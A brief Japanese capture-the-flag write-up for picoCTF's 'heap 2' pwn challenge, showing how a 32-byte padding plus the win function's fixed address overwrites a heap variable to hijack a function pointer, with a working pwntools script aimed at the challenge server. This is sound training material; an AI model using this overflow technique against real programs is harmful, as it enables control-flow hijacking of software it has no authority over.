---
title: "heap 2"
points: 200
tags: ["pwn"]
---

変数xにwin関数のアドレスを入力できるとフラグをゲットしてクリアとなる。

```c
void check_win() { ((void (*)())*(int*)x)(); }
```

PIEは無効化されているのでwin関数のアドレスは固定。

```
gef➤  print win
$1 = {void ()} 0x4011a0 <win>
```

以下のようなコードでフラグゲット。

```python
from pwn import *

elf = ELF('./chall')
# p = process('./chall')
p = remote('mimas.picoctf.net', 61462)

# gdb.attach(p, gdbscript='continue')

p.sendlineafter(b'Enter your choice: ', b'2')
p.sendlineafter(b'Data for buffer: ', b'a'*32 + p64(elf.symbols['win']))

# x = win
p.sendline(b'2')
p.sendline(b'a'*32 + p64(elf.symbols['win']))

# p.interactive() # => 4
```